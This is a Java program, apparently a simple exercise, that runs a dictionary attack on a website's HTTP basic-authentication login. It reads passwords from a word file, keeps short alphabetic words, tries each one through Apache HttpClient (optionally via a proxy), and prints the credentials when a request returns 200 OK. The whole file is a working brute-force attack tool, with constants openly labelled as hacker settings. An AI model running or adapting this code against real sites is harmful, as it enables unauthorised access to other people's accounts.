

import java.io.BufferedReader;
import java.io.FileReader;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.UsernamePasswordCredentials;
import org.apache.commons.httpclient.cookie.CookiePolicy;
import org.apache.commons.httpclient.methods.GetMethod;




public class  Dictionary{
    static final String LOGON_SITE_HACKER = DictionaryPropertyHelper.getProperty("logonSite");
    static final int    LOGON_PORT_HACKER = Integer.valueOf(DictionaryPropertyHelper.getProperty("logonPort")).intValue();
	static final String cad = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklumnopqrstuvwxyz";

    static final int    USE_PROXY_SERVER  = Integer.valueOf(DictionaryPropertyHelper.getProperty("useProxyServer")).intValue();
    static final int    PROXY_PORT        = Integer.valueOf(DictionaryPropertyHelper.getProperty("proxyPort")).intValue();

    static final String PROXY_SERVER      = DictionaryPropertyHelper.getProperty("proxyServer");
    static final String PROXY_USENAME     = DictionaryPropertyHelper.getProperty("proxyUserName");
    static final String PROXY_PASSWORD    = DictionaryPropertyHelper.getProperty("proxypassword");



    static final String GET_METHOD_HACKER = DictionaryPropertyHelper.getProperty("getMethod");
    static final int    NUMBER_OF_GETS_BEFORE_RELEASE = Integer.valueOf(DictionaryPropertyHelper.getProperty("numberOfGetsBeforeReleaseConnection")).intValue();


    public Dictionary() {
        super();
    }





    public static void main(String[] args) throws Exception {

		String statusLine = " ";
		int count = 0;
		int divValue = 0;

		String userName = "";
		String password = "";


        HttpClient client = new HttpClient();

        if (USE_PROXY_SERVER == 1) {
  			client.getHostConfiguration().setProxy(PROXY_SERVER, PROXY_PORT);
  			client.getState().setProxyCredentials(null, null, new UsernamePasswordCredentials(PROXY_USENAME, PROXY_PASSWORD));

        }
        client.getState().setCookiePolicy(CookiePolicy.COMPATIBILITY);
        client.getHostConfiguration().setHost(LOGON_SITE_HACKER, LOGON_PORT_HACKER, "http");
        GetMethod getMethod = new GetMethod(GET_METHOD_HACKER);



		
    	BufferedReader wordFile = new BufferedReader(new FileReader(DictionaryPropertyHelper.getProperty("dictionaryFile")));

		while ((password = wordFile.readLine()) != null) {


			if (validateWord(password)) {

				client.getState().setCredentials(null, null, new UsernamePasswordCredentials(userName, password));
				++count;
				System.out.println(" Counter " + count + " Password " + password);

				divValue = count % NUMBER_OF_GETS_BEFORE_RELEASE;

				if (divValue == 0) {



					System.out.println("Count: "+ count + " Div Value: "+ divValue+ " Releasing the connection and getting new one");
					getMethod.releaseConnection();
					getMethod = null;
					getMethod = new GetMethod(GET_METHOD_HACKER);

				}

		        client.executeMethod(getMethod);

		        statusLine = getMethod.getStatusLine().toString();


				
				

				if (statusLine.compareTo("HTTP/1.1 200 OK") == 0) {


					System.out.println("Found the user name and password for the site. The username is: "+ userName+ " and the password is: "+ password);


					System.exit(0);
				}


			}

		}

		System.out.println("Could not find the password!");

    }



	
	public static boolean validateWord(String str) {

	


		boolean isValid = false;

		
		if (str.length() > 3) {
			return isValid;
		}

		for (int i = 0; i < str.length(); i++) {
			for (int j = 0; j < cad.length(); j++) {
				if (str.charAt(i) == cad.charAt(j)) {
					isValid = true;
					break;
				}
				else
					isValid = false;
			}
			if (!isValid)
				break;
		}
		return isValid;
	}


}
